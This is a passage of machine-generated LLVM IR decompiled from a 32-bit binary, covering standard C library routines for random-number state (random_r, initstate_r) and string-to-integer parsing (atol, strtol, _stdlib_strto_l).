  %v1_8050ea3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ea3 = mul i32 %v1_8050ea3, 4
  %v3_8050ea3 = add i32 %v2_8050ea3, %v0_8050ea3
  store i32 %v3_8050ea3, i32* %eax.global-to-local, align 4
  %v1_8050ea6 = load i32, i32* @esi, align 4
  %v2_8050ea6 = inttoptr i32 %v1_8050ea6 to i32*
  store i32 %v3_8050ea3, i32* %v2_8050ea6, align 4
  %v3_8050ea8 = load i64, i64* %stack_var_-40, align 8
  %v6_8050ea8 = mul nsw i64 %v3_8050ea8, 10
  %v7_8050ea8 = trunc i64 %v6_8050ea8 to i32
  %v2_8050eae = ptrtoint i32* %stack_var_-20 to i32
  %v1_8050ebb24 = add i32 %v7_8050ea8, -1
  %v9_8050ebb25 = icmp slt i32 %v1_8050ebb24, 0
  store i32 %v1_8050ebb24, i32* @ebx, align 4
  %v1_8050ebc26 = icmp eq i1 %v9_8050ebb25, false
  br i1 %v1_8050ebc26, label %dec_label_pc_8050eae, label %dec_label_pc_8050ebe

dec_label_pc_8050eae:                             ; preds = %dec_label_pc_8050e9d, %dec_label_pc_8050eae
  store i32 %v2_8050eae, i32* %eax.global-to-local, align 4
  %v0_8050eb3 = load i32, i32* @esi, align 4
  %v2_8050eb4 = inttoptr i32 %v0_8050eb3 to i32*
  %v3_8050eb4 = call i32 @__GI_random_r(i32* %v2_8050eb4, i32 %v2_8050eae)
  store i32 %v0_8050eb3, i32* %eax.global-to-local, align 4
  store i32 %v2_8050eae, i32* %edx.global-to-local, align 4
  %v0_8050ebb.pre = load i32, i32* @ebx, align 4
  %v1_8050ebb = add i32 %v0_8050ebb.pre, -1
  %v9_8050ebb = icmp slt i32 %v1_8050ebb, 0
  store i32 %v1_8050ebb, i32* @ebx, align 4
  %v1_8050ebc = icmp eq i1 %v9_8050ebb, false
  br i1 %v1_8050ebc, label %dec_label_pc_8050eae, label %dec_label_pc_8050ebe

dec_label_pc_8050ebe:                             ; preds = %dec_label_pc_8050e9d, %dec_label_pc_8050eae, %dec_label_pc_8050e57
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050ec0

dec_label_pc_8050ec0:                             ; preds = %entry, %dec_label_pc_8050ebe
  %v0_8050ec3 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8050ebe ]
  store i32 %v0_8050ec3, i32* %eax.global-to-local, align 4
  store i32 %v0_8050e37, i32* @ebx, align 4
  store i32 %v0_8050e36, i32* @esi, align 4
  store i32 %v0_8050e35, i32* @edi, align 4
  store i32 %v0_8050e34, i32* @ebp, align 4
  ret i32 %v0_8050ec3

; uselistorder directives
  uselistorder i32 %v0_8050ec3, { 1, 0 }
  uselistorder i32 %v1_8050ebb, { 1, 0 }
  uselistorder i32 %v0_8050e9d, { 1, 0 }
  uselistorder i32 %v0_8050e98.pre, { 1, 0 }
  uselistorder i32 %v2_8050e88.v1_8050e8c, { 1, 0 }
  uselistorder i32 %v0_8050e6e, { 1, 0 }
  uselistorder i32 %v0_8050e5f, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050ec0, { 1, 0 }
  uselistorder label %dec_label_pc_8050ebe, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050eae, { 1, 0 }
  uselistorder label %dec_label_pc_8050e6e, { 1, 0 }
  uselistorder label %dec_label_pc_8050e57, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8050ecd = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_8050eee, label %dec_label_pc_8050ee2

dec_label_pc_8050ee2:                             ; preds = %entry
  %v2_8050ee2 = icmp ult i32 %arg3, 256
  %v1_8050ee9 = select i1 %v2_8050ee2, i32 5, i32 4
  store i32 %v1_8050ee9, i32* @ebx, align 4
  br label %dec_label_pc_8050f04

dec_label_pc_8050eee:                             ; preds = %entry
  %v6_8050ef1 = icmp ugt i32 %arg3, 31
  br i1 %v6_8050ef1, label %dec_label_pc_8050efc, label %dec_label_pc_8050ef3

dec_label_pc_8050ef3:                             ; preds = %dec_label_pc_8050eee
  store i32 0, i32* @ebx, align 4
  %v6_8050ef8 = icmp ugt i32 %arg3, 7
  br i1 %v6_8050ef8, label %dec_label_pc_8050f04, label %dec_label_pc_8050f54

dec_label_pc_8050efc:                             ; preds = %dec_label_pc_8050eee
  %v2_8050efc = icmp ult i32 %arg3, 64
  %v1_8050f01 = select i1 %v2_8050efc, i32 3, i32 2
  store i32 %v1_8050f01, i32* @ebx, align 4
  br label %dec_label_pc_8050f04

dec_label_pc_8050f04:                             ; preds = %dec_label_pc_8050ef3, %dec_label_pc_8050ee2, %dec_label_pc_8050efc
  %v0_8050f04 = phi i32 [ 0, %dec_label_pc_8050ef3 ], [ %v1_8050ee9, %dec_label_pc_8050ee2 ], [ %v1_8050f01, %dec_label_pc_8050efc ]
  %v1_8050f04 = mul nuw nsw i32 %v0_8050f04, 4
  %v2_8050f04 = add i32 %v1_8050f04, ptrtoint (i32* @global_var_8056e14.242 to i32)
  %v3_8050f04 = inttoptr i32 %v2_8050f04 to i32*
  %v4_8050f04 = load i32, i32* %v3_8050f04, align 4
  store i32 %v4_8050f04, i32* %eax.global-to-local, align 4
  %v1_8050f0b = add i32 %tmp7, 4
  store i32 %v1_8050f0b, i32* @esi, align 4
  %v2_8050f0e = add i32 %arg4, 16
  %v3_8050f0e = inttoptr i32 %v2_8050f0e to i32*
  store i32 %v4_8050f04, i32* %v3_8050f0e, align 4
  %v0_8050f11 = load i32, i32* @ebx, align 4
  %v1_8050f11 = mul i32 %v0_8050f11, 4
  %v2_8050f11 = add i32 %v1_8050f11, ptrtoint (i32* @global_var_8056e00.243 to i32)
  %v3_8050f11 = inttoptr i32 %v2_8050f11 to i32*
  %v4_8050f11 = load i32, i32* %v3_8050f11, align 4
  store i32 %v4_8050f11, i32* %edx.global-to-local, align 4
  %v0_8050f18 = load i32, i32* @esi, align 4
  %v1_8050f18 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050f18 = mul i32 %v1_8050f18, 4
  %v3_8050f18 = add i32 %v2_8050f18, %v0_8050f18
  store i32 %v3_8050f18, i32* %eax.global-to-local, align 4
  %v1_8050f1b = load i32, i32* @edi, align 4
  %v2_8050f1b = add i32 %v1_8050f1b, 12
  %v3_8050f1b = inttoptr i32 %v2_8050f1b to i32*
  store i32 %v0_8050f11, i32* %v3_8050f1b, align 4
  %v0_8050f1e = load i32, i32* %edx.global-to-local, align 4
  %v1_8050f1e = load i32, i32* @edi, align 4
  %v2_8050f1e = add i32 %v1_8050f1e, 20
  %v3_8050f1e = inttoptr i32 %v2_8050f1e to i32*
  store i32 %v0_8050f1e, i32* %v3_8050f1e, align 4
  %v0_8050f21 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f21 = load i32, i32* @edi, align 4
  %v2_8050f21 = add i32 %v1_8050f21, 24
  %v3_8050f21 = inttoptr i32 %v2_8050f21 to i32*
  store i32 %v0_8050f21, i32* %v3_8050f21, align 4
  %v0_8050f24 = load i32, i32* @esi, align 4
  %v1_8050f24 = load i32, i32* @edi, align 4
  %v2_8050f24 = add i32 %v1_8050f24, 8
  %v3_8050f24 = inttoptr i32 %v2_8050f24 to i32*
  store i32 %v0_8050f24, i32* %v3_8050f24, align 4
  %v0_8050f27 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8050f2c = sext i32 %arg1 to i64
  %v3_8050f2c = call i32 @srandom_r(i64 %v2_8050f2c, i32 %v0_8050f27)
  %v0_8050f31 = load i32, i32* @ebp, align 4
  %v1_8050f31 = inttoptr i32 %v0_8050f31 to i32*
  store i32 0, i32* %v1_8050f31, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050f3c = load i32, i32* @ebx, align 4
  %v1_8050f3c = icmp eq i32 %v0_8050f3c, 0
  br i1 %v1_8050f3c, label %dec_label_pc_8050f6d, label %dec_label_pc_8050f40

dec_label_pc_8050f40:                             ; preds = %dec_label_pc_8050f04
  %v0_8050f40 = load i32, i32* @edi, align 4
  %v1_8050f40 = add i32 %v0_8050f40, 4
  %v2_8050f40 = inttoptr i32 %v1_8050f40 to i32*
  %v3_8050f40 = load i32, i32* %v2_8050f40, align 4
  %v1_8050f43 = load i32, i32* @esi, align 4
  %v2_8050f43 = sub i32 %v3_8050f40, %v1_8050f43
  %v2_8050f45 = sdiv i32 %v2_8050f43, 4
  %v3_8050f48 = mul i32 %v2_8050f45, 5
  %v2_8050f4b = add i32 %v3_8050f48, %v0_8050f3c
  %v1_8050f4d = load i32, i32* @ebp, align 4
  %v2_8050f4d = inttoptr i32 %v1_8050f4d to i32*
  store i32 %v2_8050f4b, i32* %v2_8050f4d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f6d

dec_label_pc_8050f54:                             ; preds = %dec_label_pc_8050ef3
  %v1_8050f54 = call i32 @__errno_location(i32 %v0_8050ecd)
  store i32 %v1_8050f54, i32* %eax.global-to-local, align 4
  %v1_8050f59 = inttoptr i32 %v1_8050f54 to i32*
  store i32 22, i32* %v1_8050f59, align 4
  %v0_8050f5f = load i32, i32* %stack_var_-36, align 4
  %v1_8050f5f = call i32 @__errno_location(i32 %v0_8050f5f)
  %v1_8050f64 = inttoptr i32 %v1_8050f5f to i32*
  store i32 22, i32* %v1_8050f64, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f6d

dec_label_pc_8050f6d:                             ; preds = %dec_label_pc_8050f04, %dec_label_pc_8050f40, %dec_label_pc_8050f54
  %v0_8050f74 = phi i32 [ 0, %dec_label_pc_8050f04 ], [ 0, %dec_label_pc_8050f40 ], [ -1, %dec_label_pc_8050f54 ]
  ret i32 %v0_8050f74

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050f6d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050f04, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8050f83 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8050f83
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8050f9d = inttoptr i32 %arg1 to i8*
  %v5_8050f9d = call i32 @_stdlib_strto_l(i8* %v4_8050f9d, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8050f9d
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_8050fab = load i32, i32* @ebx, align 4
  store i32 %v0_8050fab, i32* %stack_var_-16, align 4
  %v0_8050faf = load i32, i32* @global_var_8058218, align 8
  %v4_8050fb5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050fb5, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8050fb5, i32* %ebx.global-to-local, align 4
  %v2_8050fc241 = load i8, i8* %arg1, align 1
  %v3_8050fc242 = sext i8 %v2_8050fc241 to i32
  store i32 %v3_8050fc242, i32* %eax.global-to-local, align 4
  %v2_8050fc543 = mul nsw i32 %v3_8050fc242, 2
  %v3_8050fc544 = add i32 %v2_8050fc543, %v0_8050faf
  %v4_8050fc545 = inttoptr i32 %v3_8050fc544 to i8*
  %v5_8050fc546 = load i8, i8* %v4_8050fc545, align 1
  %v6_8050fc547 = and i8 %v5_8050fc546, 32
  %v7_8050fc548 = icmp eq i8 %v6_8050fc547, 0
  %v1_8050fc949 = icmp eq i1 %v7_8050fc548, false
  br i1 %v1_8050fc949, label %dec_label_pc_8050fc1, label %dec_label_pc_8050fcb

dec_label_pc_8050fc1:                             ; preds = %entry, %dec_label_pc_8050fc1
  %v0_8050fc150 = phi i32 [ %v1_8050fc1, %dec_label_pc_8050fc1 ], [ %v4_8050fb5, %entry ]
  %v1_8050fc1 = add i32 %v0_8050fc150, 1
  store i32 %v1_8050fc1, i32* %ebx.global-to-local, align 4
  %v1_8050fc2 = inttoptr i32 %v1_8050fc1 to i8*
  %v2_8050fc2 = load i8, i8* %v1_8050fc2, align 1
  %v3_8050fc2 = sext i8 %v2_8050fc2 to i32
  store i32 %v3_8050fc2, i32* %eax.global-to-local, align 4
  %v2_8050fc5 = mul nsw i32 %v3_8050fc2, 2
  %v3_8050fc5 = add i32 %v2_8050fc5, %v0_8050faf
  %v4_8050fc5 = inttoptr i32 %v3_8050fc5 to i8*
  %v5_8050fc5 = load i8, i8* %v4_8050fc5, align 1
  %v6_8050fc5 = and i8 %v5_8050fc5, 32
  %v7_8050fc5 = icmp eq i8 %v6_8050fc5, 0
  %v1_8050fc9 = icmp eq i1 %v7_8050fc5, false
  br i1 %v1_8050fc9, label %dec_label_pc_8050fc1, label %dec_label_pc_8050fcb

dec_label_pc_8050fcb:                             ; preds = %dec_label_pc_8050fc1, %entry
  %v0_8050fc1.lcssa = phi i32 [ %v4_8050fb5, %entry ], [ %v1_8050fc1, %dec_label_pc_8050fc1 ]
  %v2_8050fc2.lcssa = phi i8 [ %v2_8050fc241, %entry ], [ %v2_8050fc2, %dec_label_pc_8050fc1 ]
  %v3_8050fc2.lcssa = phi i32 [ %v3_8050fc242, %entry ], [ %v3_8050fc2, %dec_label_pc_8050fc1 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_8050fcb = icmp eq i8 %v2_8050fc2.lcssa, 43
  br i1 %v9_8050fcb, label %dec_label_pc_8050fe0, label %dec_label_pc_8050fd0

dec_label_pc_8050fd0:                             ; preds = %dec_label_pc_8050fcb
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_8050fd2 = icmp eq i8 %v2_8050fc2.lcssa, 45
  %v1_8050fd5 = icmp eq i1 %v9_8050fd2, false
  br i1 %v1_8050fd5, label %dec_label_pc_8050fe1, label %dec_label_pc_8050fe0

dec_label_pc_8050fe0:                             ; preds = %dec_label_pc_8050fcb, %dec_label_pc_8050fd0
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8050fd0 ], [ 0, %dec_label_pc_8050fcb ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_8050fe0 = add i32 %v0_8050fc1.lcssa, 1
  store i32 %v1_8050fe0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050fe1

dec_label_pc_8050fe1:                             ; preds = %dec_label_pc_8050fd0, %dec_label_pc_8050fe0
  %v0_8050ff3 = phi i32 [ %v0_8050fc1.lcssa, %dec_label_pc_8050fd0 ], [ %v1_8050fe0, %dec_label_pc_8050fe0 ]
  %v1_8050fe3 = and i32 %arg3, -17
  %v2_8050fe3 = icmp eq i32 %v1_8050fe3, 0
  %v1_8050fe9 = icmp eq i1 %v2_8050fe3, false
  br i1 %v1_8050fe9, label %dec_label_pc_805100f, label %dec_label_pc_8050feb

dec_label_pc_8050feb:                             ; preds = %dec_label_pc_8050fe1
  %v1_8050feb = add i32 %arg3, 10
  store i32 %v1_8050feb, i32* %esi.global-to-local, align 4
  %v1_8050fee = inttoptr i32 %v0_8050ff3 to i8*
  %v2_8050fee = load i8, i8* %v1_8050fee, align 1
  %v8_8050fee = icmp eq i8 %v2_8050fee, 48
  %v1_8050ff1 = icmp eq i1 %v8_8050fee, false
  br i1 %v1_8050ff1, label %dec_label_pc_8051005, label %dec_label_pc_8050ff3

dec_label_pc_8050ff3:                             ; preds = %dec_label_pc_8050feb
  %v1_8050ff3 = add i32 %v0_8050ff3, 1
  store i32 %v1_8050ff3, i32* %ebx.global-to-local, align 4
  %v1_8050ff4 = add i32 %arg3, 8
  store i32 %v1_8050ff4, i32* %esi.global-to-local, align 4
  %v1_8050ff9 = inttoptr i32 %v1_8050ff3 to i8*
  %v2_8050ff9 = load i8, i8* %v1_8050ff9, align 1
  %v3_8050ff9 = zext i8 %v2_8050ff9 to i32
  %v5_8050ff9 = and i32 %v3_8050fc2.lcssa, -256
  %v6_8050ff9 = or i32 %v5_8050ff9, %v3_8050ff9
  %v1_8050ffb = or i32 %v6_8050ff9, 32
  %v3_8050ffb = trunc i32 %v1_8050ffb to i8
  store i32 %v1_8050ffb, i32* %eax.global-to-local, align 4
  %v10_8050ffe = icmp eq i8 %v3_8050ffb, 120
  %v1_8051000 = icmp eq i1 %v10_8050ffe, false
  br i1 %v1_8051000, label %dec_label_pc_8051005, label %dec_label_pc_8051002

dec_label_pc_8051002:                             ; preds = %dec_label_pc_8050ff3
  %v2_8051002 = mul i32 %v1_8050ff4, 2
  store i32 %v2_8051002, i32* %esi.global-to-local, align 4
  %v1_8051004 = add i32 %v0_8050ff3, 2
  store i32 %v1_8051004, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051005

dec_label_pc_8051005:                             ; preds = %dec_label_pc_8050ff3, %dec_label_pc_8050feb, %dec_label_pc_8051002
  %v0_805102e12 = phi i32 [ %v1_8050ff3, %dec_label_pc_8050ff3 ], [ %v0_8050ff3, %dec_label_pc_8050feb ], [ %v1_8051004, %dec_label_pc_8051002 ]
  %v0_805108520 = phi i32 [ %v1_8050ff3, %dec_label_pc_8050ff3 ], [ %v4_8050fb5, %dec_label_pc_8050feb ], [ %v1_8050ff3, %dec_label_pc_8051002 ]
  %v0_8051005 = phi i32 [ %v1_8050ff4, %dec_label_pc_8050ff3 ], [ %v1_8050feb, %dec_label_pc_8050feb ], [ %v2_8051002, %dec_label_pc_8051002 ]
  %v7_8051008 = icmp sgt i32 %v0_8051005, 16
  br i1 %v7_8051008, label %dec_label_pc_805100a, label %dec_label_pc_805100f

dec_label_pc_805100a:                             ; preds = %dec_label_pc_8051005
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805100f

dec_label_pc_805100f:                             ; preds = %dec_label_pc_8051005, %dec_label_pc_8050fe1, %dec_label_pc_805100a
  %v0_805108521 = phi i32 [ %v0_805108520, %dec_label_pc_8051005 ], [ %v4_8050fb5, %dec_label_pc_8050fe1 ], [ %v0_805108520, %dec_label_pc_805100a ]
  %v0_805102e13 = phi i32 [ %v0_805102e12, %dec_label_pc_8051005 ], [ %v0_8050ff3, %dec_label_pc_8050fe1 ], [ %v0_805102e12, %dec_label_pc_805100a ]
  %v0_805101e = phi i32 [ %v0_8051005, %dec_label_pc_8051005 ], [ %arg3, %dec_label_pc_8050fe1 ], [ 16, %dec_label_pc_805100a ]
  %v1_805100f = add i32 %v0_805101e, -2
  store i32 %v1_805100f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_8051017 = icmp ugt i32 %v1_805100f, 34
  br i1 %v6_8051017, label %dec_label_pc_805107a, label %dec_label_pc_8051019

dec_label_pc_8051019:                             ; preds = %dec_label_pc_805100f
  %div = udiv i32 -1, %v0_805101e
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_805101e
  %v1_8051020 = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_805105a = urem i32 %arg4, 256
  br label %dec_label_pc_805102e

dec_label_pc_805102c:                             ; preds = %dec_label_pc_8051070, %dec_label_pc_805105a
  %v4_805102e.pre = phi i32 [ %v1_8051044, %dec_label_pc_8051070 ], [ %v4_805102e.pre.pre, %dec_label_pc_805105a ]
  %v0_805102c = phi i32 [ %v1_805104b, %dec_label_pc_8051070 ], [ %v0_805102c.pre, %dec_label_pc_805105a ]
  br label %dec_label_pc_805102e

dec_label_pc_805102e:                             ; preds = %dec_label_pc_8051019, %dec_label_pc_805102c
  %v0_805108519 = phi i32 [ %v0_805108521, %dec_label_pc_8051019 ], [ %v0_805102c, %dec_label_pc_805102c ]
  %v0_805104b = phi i32 [ %v0_805102e13, %dec_label_pc_8051019 ], [ %v0_805102c, %dec_label_pc_805102c ]
  %v4_805102e = phi i32 [ %div, %dec_label_pc_8051019 ], [ %v4_805102e.pre, %dec_label_pc_805102c ]
  %v1_805102e = inttoptr i32 %v0_805104b to i8*
  %v2_805102e = load i8, i8* %v1_805102e, align 1
  %v3_805102e = zext i8 %v2_805102e to i32
  %v5_805102e = and i32 %v4_805102e, -256
  %v6_805102e = or i32 %v3_805102e, %v5_805102e
  store i32 %v6_805102e, i32* %eax.global-to-local, align 4
  %v1_8051030 = add i32 %v6_805102e, -48
  store i32 %v1_8051030, i32* @ecx, align 4
  %v1_8051033 = trunc i32 %v1_8051030 to i8
  %tmp55 = icmp ult i8 %v1_8051033, 10
  br i1 %tmp55, label %dec_label_pc_8051044, label %dec_label_pc_8051038

dec_label_pc_8051038:                             ; preds = %dec_label_pc_805102e
  %v1_8051038 = or i32 %v6_805102e, 32
  %v3_8051038 = trunc i32 %v1_8051038 to i8
  store i32 %v1_8051038, i32* %eax.global-to-local, align 4
  %v1_805103b = and i32 %v1_8051030, -256
  %v2_805103b = or i32 %v1_805103b, 40
  store i32 %v2_805103b, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_8051038, 97
  br i1 %tmp56, label %dec_label_pc_8051044, label %dec_label_pc_8051041

dec_label_pc_8051041:                             ; preds = %dec_label_pc_8051038
  %v1_8051041 = add i32 %v1_8051038, -87
  store i32 %v1_8051041, i32* @ecx, align 4
  br label %dec_label_pc_8051044

dec_label_pc_8051044:                             ; preds = %dec_label_pc_8051038, %dec_label_pc_805102e, %dec_label_pc_8051041
  %v0_8051073 = phi i32 [ %v2_805103b, %dec_label_pc_8051038 ], [ %v1_8051030, %dec_label_pc_805102e ], [ %v1_8051041, %dec_label_pc_8051041 ]
  %v1_8051044 = urem i32 %v0_8051073, 256
  store i32 %v1_8051044, i32* %eax.global-to-local, align 4
  %v1_8051047 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051047 = sub i32 %v1_8051044, %v1_8051047
  %v10_8051047 = and i32 %v2_8051047, %v1_8051047
  %v11_8051047 = icmp slt i32 %v10_8051047, 0
  %v13_8051047 = icmp slt i32 %v2_8051047, 0
  %v2_8051049 = icmp eq i1 %v13_8051047, %v11_8051047
  br i1 %v2_8051049, label %dec_label_pc_805107a, label %dec_label_pc_805104b

dec_label_pc_805104b:                             ; preds = %dec_label_pc_8051044
  %v1_805104b = add i32 %v0_805104b, 1
  store i32 %v1_805104b, i32* %ebx.global-to-local, align 4
  %v0_805104c = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_805104c, %div
  br i1 %tmp57, label %dec_label_pc_805105a, label %dec_label_pc_8051052

dec_label_pc_8051052:                             ; preds = %dec_label_pc_805104b
  %v15_805104c = icmp eq i32 %v0_805104c, %div
  %v1_8051052 = icmp eq i1 %v15_805104c, false
  br i1 %v1_8051052, label %dec_label_pc_8051070, label %dec_label_pc_8051054

dec_label_pc_8051054:                             ; preds = %dec_label_pc_8051052
  %v1_8051054 = trunc i32 %v0_8051073 to i8
  %tmp58 = icmp ugt i8 %v1_8051054, %v1_8051020
  br i1 %tmp58, label %dec_label_pc_805105a, label %dec_label_pc_8051070

dec_label_pc_805105a:                             ; preds = %dec_label_pc_8051054, %dec_label_pc_805104b
  store i32 %v4_805105a, i32* %eax.global-to-local, align 4
  %v0_805105e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805105e = and i32 %v0_805105e, %v4_805105a
  store i32 %v2_805105e, i32* %ebp.global-to-local, align 4
  %v1_8051060 = call i32 @__errno_location(i32 %div)
  store i32 %v1_8051060, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_8051068 = inttoptr i32 %v1_8051060 to i32*
  store i32 34, i32* %v1_8051068, align 4
  %v0_805102c.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805102e.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805102c

dec_label_pc_8051070:                             ; preds = %dec_label_pc_8051054, %dec_label_pc_8051052
  %v4_8051070 = mul i32 %v0_805104c, %v1_8051047
  store i32 %v1_8051044, i32* %eax.global-to-local, align 4
  %v2_8051076 = add i32 %v4_8051070, %v1_8051044
  store i32 %v2_8051076, i32* @edx, align 4
  br label %dec_label_pc_805102c

dec_label_pc_805107a:                             ; preds = %dec_label_pc_8051044, %dec_label_pc_805100f
  %v0_8051085 = phi i32 [ %v0_805108521, %dec_label_pc_805100f ], [ %v0_805108519, %dec_label_pc_8051044 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_805100f ], [ %div, %dec_label_pc_8051044 ]
  %v4_805107a = icmp eq i32 %arg2, 0
  br i1 %v4_805107a, label %dec_label_pc_8051087, label %dec_label_pc_8051081

dec_label_pc_8051081:                             ; preds = %dec_label_pc_805107a
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8051085 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8051085, i32* %v2_8051085, align 4
  br label %dec_label_pc_8051087

dec_label_pc_8051087:                             ; preds = %dec_label_pc_805107a, %dec_label_pc_8051081
  %v0_8051087 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_8051087, i32* %eax.global-to-local, align 4
  %v1_8051089 = trunc i32 %v0_8051087 to i8
  %v6_8051089 = icmp eq i8 %v1_8051089, 0
  %v2_805108b = zext i1 %v6_8051089 to i32
  %v1_805108d4 = or i32 %v2_805108b, -2147483648
  store i32 %v1_805108d4, i32* %ebx.global-to-local, align 4
  %v5_8051093 = icmp eq i8 %tmp37, 0
  br i1 %v5_8051093, label %dec_label_pc_80510ab, label %dec_label_pc_805109a

dec_label_pc_805109a:                             ; preds = %dec_label_pc_8051087
  %v0_805109a = load i32, i32* @edx, align 4
  %tmp59 = icmp ugt i32 %v0_805109a, %v1_805108d4
  br i1 %tmp59, label %dec_label_pc_805109e, label %dec_label_pc_80510ab

dec_label_pc_805109e:                             ; preds = %dec_label_pc_805109a
  %v1_805109e = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_805109e, i32* %eax.global-to-local, align 4
  %v0_80510a3 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80510a3, i32* @edx, align 4
  %v1_80510a5 = inttoptr i32 %v1_805109e to i32*
  store i32 34, i32* %v1_80510a5, align 4
  %v0_80510ab.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80510ab

dec_label_pc_80510ab:                             ; preds = %dec_label_pc_805109a, %dec_label_pc_8051087, %dec_label_pc_805109e
  %v0_80510ab = phi i32 [ %v0_8051087, %dec_label_pc_805109a ], [ %v0_8051087, %dec_label_pc_8051087 ], [ %v0_80510ab.pre, %dec_label_pc_805109e ]
  store i32 %v0_80510ab, i32* %eax.global-to-local, align 4
  %v3_80510ad = trunc i32 %v0_80510ab to i8
  %v4_80510ad = icmp eq i8 %v3_80510ad, 0
  %v0_80510b6.pre = load i32, i32* @edx, align 4
  br i1 %v4_80510ad, label %dec_label_pc_80510b3, label %dec_label_pc_80510b1

dec_label_pc_80510b1:                             ; preds = %dec_label_pc_80510ab
  %v1_80510b1 = sub i32 0, %v0_80510b6.pre
  store i32 %v1_80510b1, i32* @edx, align 4
  br label %dec_label_pc_80510b3

dec_label_pc_80510b3:                             ; preds = %dec_label_pc_80510ab, %dec_label_pc_80510b1
  %v0_80510b6 = phi i32 [ %v1_80510b1, %dec_label_pc_80510b1 ], [ %v0_80510b6.pre, %dec_label_pc_80510ab ]
  store i32 %v0_80510b6, i32* %eax.global-to-local, align 4
  %v2_80510b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80510b8, i32* @ebx, align 4
  ret i32 %v0_80510b6

; uselistorder directives
  uselistorder i32 %v0_80510b6, { 1, 0 }
  uselistorder i32 %v0_80510ab, { 1, 0 }
  uselistorder i32 %v0_805104c, { 0, 2, 1 }
  uselistorder i32 %v1_805104b, { 1, 0 }
  uselistorder i32 %v2_8051047, { 1, 0 }
  uselistorder i32 %v1_8051044, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8051073, { 1, 0 }
  uselistorder i32 %v0_805102c, { 1, 0 }
  uselistorder i32 %v4_805105a, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_805101e, { 1, 0, 2 }
  uselistorder i32 %v2_8051002, { 1, 0 }
  uselistorder i32 %v1_8050ffb, { 1, 0 }
  uselistorder i32 %v1_8050ff4, { 1, 0, 2 }
  uselistorder i32 %v0_8050ff3, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_8050fc2.lcssa, { 1, 0 }
  uselistorder i32 %v0_8050fc1.lcssa, { 1, 0 }
  uselistorder i32 %v1_8050fc1, { 0, 3, 2, 1 }
